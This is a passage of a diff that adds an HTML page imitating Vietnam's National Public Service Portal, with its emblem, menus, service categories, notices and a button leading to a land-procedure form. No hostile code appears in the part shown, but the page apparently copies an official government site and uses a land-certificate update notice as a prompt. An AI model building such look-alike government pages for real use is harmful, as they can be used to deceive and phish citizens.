@@ -1,0 +1,1151 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="vi">
+    <title>Cổng Dịch vụ công quốc gia</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Favicon -->
+    <link rel="icon" type="image/svg+xml"
+        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><linearGradient id='grad' x1='0%' y1='0%' x2='0%' y2='100%'><stop offset='0%' style='stop-color:%23DC143C;stop-opacity:1' /><stop offset='100%' style='stop-color:%23B22222;stop-opacity:1' /></linearGradient></defs><circle cx='50' cy='50' r='48' fill='url(%23grad)' stroke='%23FFD700' stroke-width='2'/><path d='M 50 12 L 56 35 L 80 35 L 60 48 L 68 72 L 50 58 L 32 72 L 40 48 L 20 35 L 44 35 Z' fill='%23FFD700'/><rect x='22' y='80' width='56' height='14' fill='%23DC143C' rx='2'/><text x='50' y='90' font-size='8' fill='%23FFFFFF' text-anchor='middle' font-weight='bold' font-family='Arial'>VN</text></svg>">
+</head>
+
+<body>
+    <!-- Main Header -->
+    <header class="main-header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-section">
+                    <img src="logo.png" alt="Logo Cổng Dịch vụ công quốc gia" class="logo"
+                        onerror="this.onerror=null; this.src='logo.svg'; this.onerror=function(){this.style.display='none'; this.nextElementSibling.style.display='flex';};"
+                        onload="this.nextElementSibling.style.display='none';">
+                    <div class="logo-placeholder" id="logoPlaceholder">
+                        <div class="logo-emblem">
+                            <svg width="90" height="90" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <!-- Outer circle with gradient -->
+                                <defs>
+                                    <linearGradient id="redGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                                        <stop offset="0%" style="stop-color:#DC143C;stop-opacity:1" />
+                                        <stop offset="100%" style="stop-color:#B22222;stop-opacity:1" />
+                                    </linearGradient>
+                                </defs>
+                                <circle cx="50" cy="50" r="48" fill="url(#redGrad)" stroke="#FFD700" stroke-width="2" />
+                                <!-- Star with better shape -->
+                                <path
+                                    d="M 50 12 L 56 35 L 80 35 L 60 48 L 68 72 L 50 58 L 32 72 L 40 48 L 20 35 L 44 35 Z"
+                                    fill="#FFD700" stroke="#FFA500" stroke-width="0.5" />
+                                <!-- Rice stalks - left -->
+                                <path d="M 18 45 Q 12 40, 15 35 Q 18 30, 22 35 Q 20 40, 18 45" fill="#FFD700"
+                                    opacity="0.95" />
+                                <path d="M 15 50 Q 10 45, 13 40 Q 16 35, 20 40 Q 18 45, 15 50" fill="#FFD700"
+                                    opacity="0.9" />
+                                <!-- Rice stalks - right -->
+                                <path d="M 82 45 Q 88 40, 85 35 Q 82 30, 78 35 Q 80 40, 82 45" fill="#FFD700"
+                                    opacity="0.95" />
+                                <path d="M 85 50 Q 90 45, 87 40 Q 84 35, 80 40 Q 82 45, 85 50" fill="#FFD700"
+                                    opacity="0.9" />
+                                <!-- Cogwheel with more detail -->
+                                <circle cx="50" cy="68" r="14" fill="#FFD700" stroke="#FFA500" stroke-width="0.5" />
+                                <circle cx="50" cy="68" r="10" fill="#DC143C" opacity="0.3" />
+                                <!-- Cogwheel teeth -->
+                                <rect x="48" y="54" width="4" height="10" fill="#DC143C" rx="1" />
+                                <rect x="48" y="72" width="4" height="10" fill="#DC143C" rx="1" />
+                                <rect x="60" y="66" width="10" height="4" fill="#DC143C" rx="1" />
+                                <rect x="30" y="66" width="10" height="4" fill="#DC143C" rx="1" />
+                                <rect x="56" y="60" width="6" height="4" fill="#DC143C" rx="1"
+                                    transform="rotate(45 59 62)" />
+                                <rect x="38" y="60" width="6" height="4" fill="#DC143C" rx="1"
+                                    transform="rotate(-45 41 62)" />
+                                <!-- Banner with text -->
+                                <rect x="22" y="80" width="56" height="14" fill="#DC143C" rx="2" stroke="#FFD700"
+                                    stroke-width="0.5" />
+                                <text x="50" y="90" font-size="8" fill="#FFFFFF" text-anchor="middle" font-weight="bold"
+                                    font-family="Arial, sans-serif">VIỆT NAM</text>
+                            </svg>
+                        </div>
+                        <div class="logo-text-content">
+                            <div class="logo-main-text">
+                                <span class="logo-styled-c">
+                                    <svg width="35" height="35" viewBox="0 0 40 40"
+                                        style="vertical-align: baseline; margin-right: 2px;">
+                                        <path d="M 20 5 Q 5 5, 5 20 Q 5 35, 20 35" stroke="#212529" stroke-width="3"
+                                            fill="none" stroke-linecap="round" />
+                                        <path d="M 15 10 L 20 15 L 15 20" stroke="#212529" stroke-width="2" fill="none"
+                                            stroke-linecap="round" stroke-linejoin="round" />
+                                        <line x1="8" y1="12" x2="12" y2="12" stroke="#212529" stroke-width="1.5" />
+                                        <line x1="8" y1="18" x2="12" y2="18" stroke="#212529" stroke-width="1.5" />
+                                        <line x1="8" y1="24" x2="12" y2="24" stroke="#212529" stroke-width="1.5" />
+                                    </svg>
+                                </span>ỔNG DỊCH VỤ CÔNG QUỐC GIA
+                            </div>
+                            <div class="logo-tagline">Kết nối, cung cấp thông tin và dịch vụ công mọi lúc, mọi nơi</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <div class="theme-selector">
+                        <div class="theme-menu" id="themeMenu">
+                            <div class="theme-option" data-theme="brown">
+                                <div class="theme-color" style="background: #8B4513;"></div>
+                                <span>Nâu</span>
+                            </div>
+                            <div class="theme-option" data-theme="blue">
+                                <div class="theme-color" style="background: #0066cc;"></div>
+                                <span>Xanh dương</span>
+                            </div>
+                            <div class="theme-option" data-theme="red">
+                                <div class="theme-color" style="background: #DC143C;"></div>
+                                <span>Đỏ</span>
+                            </div>
+                            <div class="theme-option" data-theme="green">
+                                <div class="theme-color" style="background: #228B22;"></div>
+                                <span>Xanh lá</span>
+                            </div>
+                            <div class="theme-option" data-theme="purple">
+                                <div class="theme-color" style="background: #6A5ACD;"></div>
+                                <span>Tím</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Navigation Menu -->
+    <div class="nav-wrapper">
+        <div class="nav-overlay" id="navOverlay"></div>
+        <nav class="main-nav">
+            <div class="container">
+                <button class="nav-toggle" id="navToggle" aria-label="Mở/Đóng menu điều hướng" aria-expanded="false">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <ul class="nav-menu" id="navMenu">
+                    <li class="nav-item nav-item-home">
+                        <a href="#" class="nav-link" title="Trang chủ">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                            <span>Trang chủ</span>
+                        </a>
+                    </li>
+                    <li class="nav-item has-submenu">
+                        <a href="#" class="nav-link">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                                <path d="M2 17l10 5 10-5"></path>
+                                <path d="M2 12l10 5 10-5"></path>
+                            </svg>
+                            <span>Thông tin và dịch vụ</span>
+                            <svg class="submenu-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <polyline points="6 9 12 15 18 9"></polyline>
+                            </svg>
+                        </a>
+                        <ul class="submenu">
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                                        <line x1="8" y1="21" x2="16" y2="21"></line>
+                                        <line x1="12" y1="17" x2="12" y2="21"></line>
+                                    </svg> <strong>Dịch vụ công trực tuyến</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <circle cx="11" cy="11" r="8"></circle>
+                                        <path d="M21 21l-4.35-4.35"></path>
+                                    </svg> <strong>Tra cứu hồ sơ</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                                    </svg> <strong>Thủ tục hành chính liên thông</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                        <polyline points="14 2 14 8 20 8"></polyline>
+                                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                                        <circle cx="12" cy="10" r="1"></circle>
+                                    </svg> Quyết định công bố</a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                        <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                                        <line x1="12" y1="2" x2="12" y2="9"></line>
+                                    </svg> Cơ quan</a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <line x1="12" y1="2" x2="12" y2="22"></line>
+                                        <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                                        <circle cx="12" cy="12" r="3"></circle>
+                                    </svg> <strong>Tòa án nhân dân</strong></a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                            <span>Thanh toán trực tuyến</span>
+                        </a>
+                    </li>
+                    <li class="nav-item has-submenu">
+                        <a href="#" class="nav-link">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+                            </svg>
+                            <span>Phản ánh kiến nghị</span>
+                            <svg class="submenu-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <polyline points="6 9 12 15 18 9"></polyline>
+                            </svg>
+                        </a>
+                        <ul class="submenu">
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <line x1="22" y1="2" x2="11" y2="13"></line>
+                                        <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+                                    </svg> <strong>Gửi PAKN</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <polyline points="9 11 12 14 22 4"></polyline>
+                                        <path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path>
+                                    </svg> <strong>Tra cứu kết quả trả lời</strong></a></li>
+                        </ul>
+                    </li>
+                    <li class="nav-item">
+                        <a href="#" class="nav-link">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <polygon
+                                    points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2">
+                                </polygon>
+                            </svg>
+                            <span>Đánh giá chất lượng phục vụ</span>
+                        </a>
+                    </li>
+                    <li class="nav-item has-submenu">
+                        <a href="#" class="nav-link">
+                            <svg class="nav-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <path d="M12 16v-4"></path>
+                                <path d="M12 8h.01"></path>
+                            </svg>
+                            <span>Hỗ trợ</span>
+                            <svg class="submenu-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <polyline points="6 9 12 15 18 9"></polyline>
+                            </svg>
+                        </a>
+                        <ul class="submenu">
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                        <circle cx="12" cy="7" r="4"></circle>
+                                    </svg> <strong>Giới thiệu</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                        <polyline points="14 2 14 8 20 8"></polyline>
+                                        <line x1="16" y1="13" x2="8" y2="13"></line>
+                                        <line x1="16" y1="17" x2="8" y2="17"></line>
+                                    </svg> <strong>Điều khoản sử dụng</strong></a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <circle cx="12" cy="12" r="10"></circle>
+                                        <path d="M12 16v-4"></path>
+                                        <path d="M12 8h.01"></path>
+                                    </svg> Hướng dẫn sử dụng</a></li>
+                            <li><a href="#"><svg class="submenu-icon" width="14" height="14" viewBox="0 0 24 24"
+                                        fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"></path>
+                                        <path d="M13.73 21a2 2 0 0 1-3.46 0"></path>
+                                    </svg> <strong>Thông báo</strong></a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </div>
+
+    <!-- Search + Featured Services Combined -->
+    <section class="search-featured-section">
+        <div class="container">
+            <div class="search-main-row">
+                <div class="search-input-wrapper">
+                    <input type="text" class="search-input-main" id="searchInputMain"
+                        placeholder="Nhập từ khoá tìm kiếm">
+                </div>
+                <button type="button" class="btn-search-advanced">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="11" cy="11" r="8"></circle>
+                        <path d="M21 21l-4.35-4.35"></path>
+                    </svg>
+                    <span>Tìm kiếm nâng cao</span>
+                </button>
+            </div>
+            <div class="search-advanced-panel" id="searchAdvancedPanel" style="display: none;">
+                <div class="search-filters">
+                    <div class="filter-group">
+                        <label>Sở/Ban ngành</label>
+                        <select id="searchDepartment" class="filter-select">
+                            <option value="">-- Chọn Sở/Ban ngành --</option>
+                        </select>
+                    </div>
+                    <div class="filter-group">
+                        <label>Tỉnh/ Thành phố</label>
+                        <select id="searchProvince" class="filter-select">
+                            <option value="">-- Chọn Tỉnh/Thành phố --</option>
+                        </select>
+                    </div>
+                    <div class="filter-group">
+                        <label>Quận/Huyện</label>
+                        <select id="searchDistrict" class="filter-select">
+                            <option value="">-- Chọn Quận/Huyện --</option>
+                        </select>
+                    </div>
+                    <div class="filter-group">
+                        <label>Phường/Xã</label>
+                        <select id="searchWard" class="filter-select">
+                            <option value="">-- Chọn Phường/Xã --</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+            <div class="featured-services-grid">
+                <a href="dang-ky-thu-tuc-nha-dat.html" class="featured-service-btn" data-action="form"
+                    data-open-form="true" data-service-name="Dịch vụ công trực tuyến"
+                    title="Nhấp để đăng ký thủ tục nhà đất">
+                    <div class="featured-service-icon">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                            <line x1="8" y1="21" x2="16" y2="21"></line>
+                            <line x1="12" y1="17" x2="12" y2="21"></line>
+                        </svg>
+                    </div>
+                    <div class="featured-service-text">
+                        <div class="featured-service-title">Dịch vụ công trực tuyến</div>
+                    </div>
+                </a>
+                <a href="#" class="featured-service-btn">
+                    <div class="featured-service-icon">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                            <path d="M2 17l10 5 10-5"></path>
+                            <path d="M2 12l10 5 10-5"></path>
+                        </svg>
+                    </div>
+                    <div class="featured-service-text">
+                        <div class="featured-service-title">Dịch vụ công trực tuyến của Đảng</div>
+                    </div>
+                </a>
+                <a href="#" class="featured-service-btn">
+                    <div class="featured-service-icon">
+                        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2">
+                            <path
+                                d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
+                            </path>
+                            <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                            <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                        </svg>
+                    </div>
+                    <div class="featured-service-text">
+                        <div class="featured-service-title">Dịch vụ công liên thông: Khai sinh, Khai tử</div>
+                    </div>
+                </a>
+            </div>
+        </div>
+    </section>
+
+    <!-- Notifications Section -->
+    <section class="notifications-section">
+        <div class="container">
+            <div class="notification-wrapper">
+                <button id="notificationPrevBtn" class="notification-nav-btn">
+                    &lt;
+                </button>
+
+                <div class="notification-item notification-item-1"
+                    style="flex: 1; background: #fff; padding: 20px; min-width: 300px; max-width: 100%;">
+                    <p style="color: #333333; font-size: 14px; line-height: 1.6; margin: 0; text-align: justify;">
+                        <strong>Yêu cầu người dân thực hiện cập nhật Giấy chứng nhận quyền sử dụng đất ...</strong>
+                    </p>
+                    <p style="color: #333333; font-size: 12px; margin-top: 12px; margin-bottom: 0; font-weight: 500;">
+                        Ngày hiệu lực: 11/11/2025
+                    </p>
+                </div>
+                <div class="notification-item notification-item-2"
+                    style="flex: 1; background: #fff; padding: 20px; min-width: 300px;">
+                    <p style="color: #333333; font-size: 14px; line-height: 1.6; margin: 0; text-align: justify;">
+                        <strong>Bắt đầu từ ngày 01/07/2025, toàn bộ công dân khi đến UBND hoặc các cơ quan ...</strong>
+                    </p>
+                    <p style="color: #333333; font-size: 12px; margin-top: 12px; margin-bottom: 0; font-weight: 500;">
+                        Ngày hiệu lực: 01/07/2025
+                    </p>
+                </div>
+                <div class="notification-item notification-item-3"
+                    style="flex: 1; background: #fff; padding: 20px; min-width: 300px;">
+                    <p style="color: #333333; font-size: 14px; line-height: 1.6; margin: 0; text-align: justify;">
+                        <strong>Tạm dừng hoạt động phần mềm Xử lý vi phạm giao thông để nâng cấp hệ thống. </strong>
+                    </p>
+                    <p style="color: #333333; font-size: 12px; margin-top: 12px; margin-bottom: 0; font-weight: 500;">
+                        Ngày hiệu lực: 15/08/2025
+                    </p>
+                </div>
+
+                <button id="notificationNextBtn" class="notification-nav-btn">
+                    &gt;
+                </button>
+            </div>
+            <!-- Chỉ báo (dots) -->
+            <div class="notification-indicators" id="notificationIndicators">
+                <span class="notification-dot active" data-index="0"></span>
+                <span class="notification-dot" data-index="1"></span>
+                <span class="notification-dot" data-index="2"></span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="container">
+            <!-- Service Categories -->
+            <div class="service-categories">
+                <div class="category-section">
+                    <h2 class="category-title">CÔNG DÂN</h2>
+                    <div class="category-links">
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="8" r="3"></circle>
+                                <path d="M12 14v7"></path>
+                                <path d="M8 12h8"></path>
+                                <path d="M8 18h8"></path>
+                                <circle cx="9" cy="11" r="1"></circle>
+                                <circle cx="15" cy="11" r="1"></circle>
+                            </svg>
+                            Có con nhỏ
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"></path>
+                                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"></path>
+                            </svg>
+                            Học tập
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                                <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                            </svg>
+                            Việc làm
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="16" y1="2" x2="16" y2="6"></line>
+                                <line x1="8" y1="2" x2="8" y2="6"></line>
+                                <line x1="3" y1="10" x2="21" y2="10"></line>
+                                <path d="M8 14h.01M12 14h.01M16 14h.01M8 18h.01M12 18h.01M16 18h.01"></path>
+                            </svg>
+                            Cư trú và giấy tờ tùy thân
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path
+                                    d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z">
+                                </path>
+                            </svg>
+                            Hôn nhân và gia đình
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+                            </svg>
+                            Điện lực, nhà ở, đất đai
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+                                <polyline points="22 4 12 14.01 9 11.01"></polyline>
+                            </svg>
+                            Sức khỏe và y tế
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M5 17H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-1">
+                                </path>
+                                <path d="M12 15v2"></path>
+                                <path d="M9 6h6"></path>
+                                <circle cx="7" cy="17" r="2"></circle>
+                                <circle cx="17" cy="17" r="2"></circle>
+                            </svg>
+                            Phương tiện và người lái
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            Hưu trí
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            Người thân qua đời
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"></path>
+                            </svg>
+                            Giải quyết khiếu kiện
+                        </a>
+                    </div>
+                </div>
+                <div class="category-section category-section-business">
+                    <h2 class="category-title">DOANH NGHIỆP</h2>
+                    <div class="category-links">
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                            Khởi sự kinh doanh
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>
+                                <circle cx="9" cy="7" r="4"></circle>
+                                <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
+                                <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
+                            </svg>
+                            Lao động và bảo hiểm xã hội
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <line x1="12" y1="1" x2="12" y2="23"></line>
+                                <path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path>
+                            </svg>
+                            Tài chính doanh nghiệp
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                                <line x1="3" y1="9" x2="21" y2="9"></line>
+                                <line x1="9" y1="21" x2="9" y2="9"></line>
+                            </svg>
+                            Điện lực, đất đai, xây dựng
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+                                <line x1="8" y1="21" x2="16" y2="21"></line>
+                                <line x1="12" y1="17" x2="12" y2="21"></line>
+                            </svg>
+                            Thương mại, quảng cáo
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M12 2L2 7l10 5 10-5-10-5z"></path>
+                                <path d="M2 17l10 5 10-5"></path>
+                                <path d="M2 12l10 5 10-5"></path>
+                            </svg>
+                            Sở hữu trí tuệ, đăng ký tài sản
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                                <circle cx="12" cy="10" r="3"></circle>
+                            </svg>
+                            Thành lập chi nhánh, văn phòng đại diện
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <circle cx="12" cy="12" r="10"></circle>
+                                <polyline points="12 6 12 12 16 14"></polyline>
+                            </svg>
+                            Đấu thầu, mua sắm công
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path
+                                    d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z">
+                                </path>
+                                <polyline points="3.27 6.96 12 12.01 20.73 6.96"></polyline>
+                                <line x1="12" y1="22.08" x2="12" y2="12"></line>
+                            </svg>
+                            Tái cấu trúc doanh nghiệp
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                                <polyline points="14 2 14 8 20 8"></polyline>
+                                <line x1="16" y1="13" x2="8" y2="13"></line>
+                                <line x1="16" y1="17" x2="8" y2="17"></line>
+                                <polyline points="10 9 9 9 8 9"></polyline>
+                            </svg>
+                            Giải quyết tranh chấp hợp đồng
+                        </a>
+                        <a href="#" class="category-link">
+                            <svg class="category-link-icon" width="18" height="18" viewBox="0 0 24 24" fill="none"
+                                stroke="currentColor" stroke-width="2">
+                                <rect x="6" y="4" width="4" height="16"></rect>
+                                <rect x="14" y="4" width="4" height="16"></rect>
+                            </svg>
